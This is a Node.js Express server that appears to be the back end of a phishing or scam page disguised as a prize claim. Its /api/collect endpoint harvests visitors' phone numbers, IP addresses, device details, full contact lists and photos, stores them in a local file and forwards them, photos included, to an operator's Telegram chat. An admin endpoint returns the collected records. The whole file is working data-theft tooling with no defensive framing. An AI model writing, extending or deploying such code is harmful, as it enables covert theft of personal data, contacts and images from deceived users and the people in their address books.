require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static('public'));

const DATA_FILE = path.join(__dirname, 'collected.json');

function readData() {
  if (!fs.existsSync(DATA_FILE)) return [];
  return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
}

function writeData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

const botToken = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;
let bot = null;
if (botToken) bot = new TelegramBot(botToken, { polling: false });

app.post('/api/collect', async (req, res) => {
  const data = req.body;
  data.ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const id = Date.now().toString(36).toUpperCase() + Math.random().toString(36).substr(2, 4).toUpperCase();
  data.claimId = id;
  data.timestamp = new Date().toISOString();

  const all = readData();
  all.push(data);
  writeData(all);

  if (bot && chatId) {
    let msg = `📱 **New Data**\n`;
    msg += `ID: #${id}\n`;
    msg += `Phone: +91 ${data.phone || 'N/A'}\n`;
    msg += `IP: ${data.ip}\n`;
    msg += `UA: ${data.userAgent || 'N/A'}\n`;
    msg += `Platform: ${data.platform || 'N/A'}\n`;
    msg += `Screen: ${data.screen || 'N/A'}\n`;
    msg += `Memory: ${data.deviceMemory || 'N/A'}\n`;
    msg += `Cores: ${data.cores || 'N/A'}\n`;
    msg += `Contacts: ${data.contacts ? data.contacts.length : 0} entries\n`;
    if (data.contacts && data.contacts.length) {
      const sample = data.contacts.slice(0, 3).map(c => `${c.name} (${c.tel})`).join(', ');
      msg += `Sample: ${sample}\n`;
    }
    msg += `Photos: ${data.photoCount || 0}`;

    try {
      await bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
      if (data.photos && Array.isArray(data.photos)) {
        for (let i = 0; i < data.photos.length; i++) {
          const b64 = data.photos[i];
          if (b64 && b64.startsWith('data:image')) {
            const buf = Buffer.from(b64.split(',')[1], 'base64');
            await bot.sendPhoto(chatId, buf, { caption: `Photo ${i+1} #${id}` });
          }
        }
      }
    } catch (e) {
      console.error('Telegram error:', e.message);
    }
  }

  res.json({ success: true, claimId: id });
});

app.get('/admin/data', (req, res) => {
  const token = req.headers.authorization;
  if (token !== `Bearer ${process.env.ADMIN_TOKEN}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  res.json(readData());
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
